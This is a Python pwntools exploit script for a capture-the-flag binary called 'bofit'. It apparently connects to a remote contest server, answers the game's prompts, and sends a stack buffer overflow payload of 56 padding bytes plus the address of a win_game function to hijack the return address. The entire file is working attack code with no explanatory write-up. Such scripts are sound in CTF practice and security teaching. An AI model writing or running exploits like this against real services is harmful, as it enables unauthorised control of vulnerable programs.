#!/usr/bin/env python3
import pwn

host = 'umbccd.io'
port = 4100
target = './bofit'

def exploit(remote):
    if remote:
        pr = pwn.connect(host, port)
    else:
        pr = pwn.process(target)

    try:
        elf = pwn.ELF(target)
        print('win_game @', hex(elf.sym['win_game']))
        pr.sendlineafter('BOF it to start!\n', 'BOF')

        payload = b'A'*56
        payload += pwn.p64(elf.sym['win_game'])
        shouted = False
        print(payload)

        while True:
            cmd = pr.readline()
            print(cmd)
            if b"Twist" in cmd:
                if shouted:
                    pr.send(payload)
                    pr.sendline()
                    print(pr.readall(2))
                else:
                    pr.sendline('T')
            elif b"Pull" in cmd:
                if shouted:
                    pr.send(payload)
                    pr.sendline()
                    print(pr.readall(2))
                else:
                    pr.sendline('P')
            elif b"BOF" in cmd:
                if shouted:
                    pr.send(payload)
                    pr.sendline()
                    print(pr.readall(2))
                else:
                    pr.sendline('B')
            elif b"Shout" in cmd:
                pr.send(payload)
                pr.sendline()
                shouted = True
    finally:
        pr.close()

exploit(True)
